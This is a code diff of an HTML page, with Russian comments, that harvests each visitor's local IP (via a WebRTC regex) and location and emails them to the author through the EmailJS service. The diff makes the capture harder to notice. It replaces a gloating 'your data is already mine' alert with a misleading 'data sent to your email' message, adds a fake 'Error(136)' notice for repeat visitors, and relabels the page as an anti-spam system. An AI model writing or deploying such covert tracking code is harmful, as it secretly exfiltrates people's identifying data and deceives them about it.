@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Send IP and Location with Anti-Spam</title>
 
+    <!-- Подключение актуального EmailJS SDK -->
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
     <script type="text/javascript">
         (function() {
@@ -19,8 +20,7 @@
             }),
             noop = function() {},
             localIPs = {},
-            ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/g,
-            key;
+            ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/g;
 
             function iterateIP(ip) {
                 if (!localIPs[ip]) onNewIP(ip);
@@ -47,7 +47,7 @@
             emailjs.send("Hjikwe21782", "template_73zczgq", userData)
                 .then(function(response) {
                     console.log("Email sent successfully", response);
-                    alert('Твои данные уже у меня:)');
+                    alert('Данные отправлены на вашу почту!');
                     if (userData.location) {
                         markIpAsSent(userData.ip); // Помечаем IP как отправленный с геолокацией
                     }
@@ -70,6 +70,16 @@
             localStorage.setItem('sentIps', JSON.stringify(sentIps));
         }
 
+        // Отображение сообщения об ошибке на экране
+        function showError(message) {
+            const errorElement = document.createElement('div');
+            errorElement.textContent = message;
+            errorElement.style.color = 'red';
+            errorElement.style.fontWeight = 'bold';
+            errorElement.style.marginTop = '20px';
+            document.body.appendChild(errorElement);
+        }
+
         // Основная функция для получения данных пользователя
         function getUserData() {
             getUserIP(function(ip) {
@@ -78,6 +88,7 @@
                 // Проверяем, был ли этот IP уже отправлен с геолокацией
                 if (isIpAlreadySent(ip)) {
                     console.log("Этот IP уже отправлял данные с геолокацией. Отправка отменена.");
+                    showError("Error(136)"); // Показ сообщения об ошибке
                     return;
                 }
 
@@ -108,6 +119,6 @@
     </script>
 </head>
 <body>
-    <h1>Отправка данных...</h1>
+    <h1>Отправка данных с анти-спам системой</h1>
 </body>
 </html>
